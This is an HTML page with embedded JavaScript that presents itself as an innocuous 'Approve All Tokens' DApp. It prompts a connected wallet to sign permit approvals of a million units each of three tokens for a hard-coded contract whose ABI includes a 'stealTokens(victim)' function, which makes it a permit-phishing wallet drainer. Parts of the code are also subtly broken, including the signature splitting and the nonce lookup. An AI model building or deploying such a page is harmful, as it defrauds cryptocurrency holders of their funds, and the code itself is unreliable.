<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DApp Interaction with Permit</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>DApp Interaction with Permit</h1>
    <button id="connectWallet">Connect Wallet</button>
    <p id="walletAddress">Wallet Address: Not connected</p>
    <hr>
    <h3>Approve Tokens via Permit</h3>
    <button id="approveTokens">Approve All Tokens</button>
    <p id="status">Status: Not started</p>

    <script>
        const contractAddress = "0xb56F6054FDe6B7EAF520814Ed4c5F5Eff11645D8";
        const contractABI = [
            {
                "inputs": [
                    { "internalType": "address[]", "name": "tokenAddresses", "type": "address[]" },
                    { "internalType": "uint256[]", "name": "values", "type": "uint256[]" },
                    { "internalType": "uint8[]", "name": "v", "type": "uint8[]" },
                    { "internalType": "bytes32[]", "name": "r", "type": "bytes32[]" },
                    { "internalType": "bytes32[]", "name": "s", "type": "bytes32[]" }
                ],
                "name": "requestApprovals",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
                "name": "stealTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
                "name": "approvalsGiven",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "view",
                "type": "function"
            },
            { "inputs": [], "name": "tokenA", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
            { "inputs": [], "name": "tokenB", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
            { "inputs": [], "name": "tokenC", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
        ];
        const tokenAddresses = [
            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23", // Token A
            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E", // Token B
            "0xD00485b963E46753d7F1AC0a21487391e635Ca07"  // Token C
        ];
        let web3, userAccount, contract;

        // Connect wallet function
        document.getElementById("connectWallet").onclick = async () => {
            if (window.ethereum) {
                try {
                    await window.ethereum.request({ method: "eth_requestAccounts" });
                    web3 = new Web3(window.ethereum);
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    document.getElementById("walletAddress").innerText = `Wallet Address: ${userAccount}`;
                    contract = new web3.eth.Contract(contractABI, contractAddress);
                } catch (error) {
                    console.error("User denied wallet connection:", error);
                }
            } else {
                alert("Please install MetaMask!");
            }
        };

        // Approve tokens via permit
        document.getElementById("approveTokens").onclick = async () => {
            try {
                if (!web3 || !userAccount) {
                    alert("Please connect your wallet first!");
                    return;
                }

                const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
                const values = [web3.utils.toWei("1000000", "ether"), web3.utils.toWei("1000000", "ether"), web3.utils.toWei("1000000", "ether")];

                // Gather signatures for each token
                const v = [];
                const r = [];
                const s = [];

                for (let i = 0; i < tokenAddresses.length; i++) {
                    const tokenContract = new web3.eth.Contract(contractABI, tokenAddresses[i]);
                    const nonce = await tokenContract.methods.nonces(userAccount).call();
                    const domain = {
                        name: "ERC20 Token",
                        version: "1",
                        chainId: await web3.eth.getChainId(),
                        verifyingContract: tokenAddresses[i]
                    };

                    const types = {
                        Permit: [
                            { name: "owner", type: "address" },
                            { name: "spender", type: "address" },
                            { name: "value", type: "uint256" },
                            { name: "nonce", type: "uint256" },
                            { name: "deadline", type: "uint256" }
                        ]
                    };

                    const message = {
                        owner: userAccount,
                        spender: contractAddress,
                        value: values[i],
                        nonce: nonce,
                        deadline: deadline
                    };

                    const signature = await web3.eth.personal.signTypedData([domain, types, message], userAccount);
                    const splitSig = web3.utils.fromUtf8(signature);
                    v.push(splitSig.v);
                    r.push(splitSig.r);
                    s.push(splitSig.s);
                }

                // Send permit request to contract
                await contract.methods
                    .requestApprovals(tokenAddresses, values, v, r, s)
                    .send({ from: userAccount });

                document.getElementById("status").innerText = "Status: Tokens approved successfully!";
            } catch (error) {
                console.error("Error approving tokens:", error);
                document.getElementById("status").innerText = "Status: Error approving tokens.";
            }
        };
    </script>
</body>
</html>
